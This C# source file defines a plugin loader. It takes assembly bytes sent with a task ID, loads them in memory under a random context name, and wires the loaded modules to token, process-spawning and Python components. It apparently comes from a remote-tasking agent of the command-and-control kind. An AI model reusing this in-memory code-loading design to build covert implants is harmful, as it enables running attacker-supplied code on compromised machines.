using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;
using System.Collections.Concurrent;
using System.Reflection;
using System.Runtime.Loader;

namespace Workflow.Providers
{
    public class ComponentProvider : IComponentProvider
    {
        private ConcurrentDictionary<string, IModule> loadedModules = new ConcurrentDictionary<string, IModule>();
        private AssemblyLoadContext loadContext = new AssemblyLoadContext(Misc.RandomString(10));
        private ILogger logger { get; set; }
        private IDataBroker messageManager { get; set; }
        private IServiceConfig agentConfig { get; set; }
        private ICredentialProvider tokenManager { get; set; }
        private IRuntimeExecutor spawner { get; set; }
        private IScriptEngine pythonManager { get; set; }
        public ComponentProvider(IDataBroker messageManager, ILogger logger, IServiceConfig agentConfig, ICredentialProvider tokenManager, IRuntimeExecutor spawner, IScriptEngine pythonManager) {
            this.logger = logger;
            this.messageManager = messageManager;
            this.agentConfig= agentConfig;
            this.tokenManager = tokenManager;
            this.spawner = spawner;
            this.pythonManager = pythonManager;
        }
        
        private bool TryLoadModule(string name, out IModule? plugOut)
        {
            plugOut = null;
            try
            {
                Assembly _tasksAsm = Assembly.Load($"{name}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");

                if(_tasksAsm is null)
                {
                    return false;
                }

                if(ParseAssemblyForModule(_tasksAsm))
                {
                    return this.loadedModules.TryGetValue(name, out plugOut);
                }
            }
            catch (Exception e)
            {
            }
            return false;

        }

        public bool LoadAssemblyAsync(string task_id, byte[] buf)
        {
            try
            {
                var loadedAssembly = this.loadContext.LoadFromStream(new MemoryStream(buf));
                messageManager.AddTaskResponse(new TaskResponse
                {
                    task_id = task_id,
                    user_output = "Loaded.",
                    completed = true
                });
                return true;
            }
            catch (Exception e)
            {
                messageManager.AddTaskResponse(new TaskResponse
                {
                    task_id = task_id,
                    completed = true,
                    user_output = e.ToString(),
                    status = "error",
                });
            }
            return false;
        }
        public bool LoadModuleAsync(string task_id, string moduleName, byte[] buf)
        {
            try {
                var loadedAssembly = this.loadContext.LoadFromStream(new MemoryStream(buf));

                if (this.loadedModules.ContainsKey(moduleName))
                {
                    this.messageManager.AddTaskResponse(new LoadTaskResponse
                    {
                        completed = true,
                        user_output = "Module already loaded.",
                        task_id = task_id,
                        status = "error"
                    });
                    return false;
                }

                if (this.ParseAssemblyForModule(loadedAssembly))
                {
                    return true;
                }
            }
            catch (Exception e)
            {
                this.messageManager.AddTaskResponse(new LoadTaskResponse
                {
                    completed = true,
                    task_id = task_id,
                    status = "error",
                    user_output = e.ToString()
                });
            }

            return false;
        }
        private bool ParseAssemblyForModule(Assembly asm)
        {
            foreach (Type t in asm.GetTypes())
            {
                if (typeof(IModule).IsAssignableFrom(t))
                {
                    IModule plug = (IModule)Activator.CreateInstance(t, messageManager, agentConfig, logger, tokenManager, spawner, pythonManager);
                    this.loadedModules.GetOrAdd(plug.Name, plug);

                    return true;
                }
            }
            return false;
        }
        public bool TryGetModule<T>(string name, out T? plugin) where T : IModule
        {
            IModule plug = null;


            if(loadedModules.TryGetValue(name, out plug) || this.TryLoadModule(name, out plug))
            {
                if (plug is T typedPlugin)
                {
                    plugin = typedPlugin;
                    return true;
                }
            }

            plugin = default(T);
            return false;
        }
    }
}
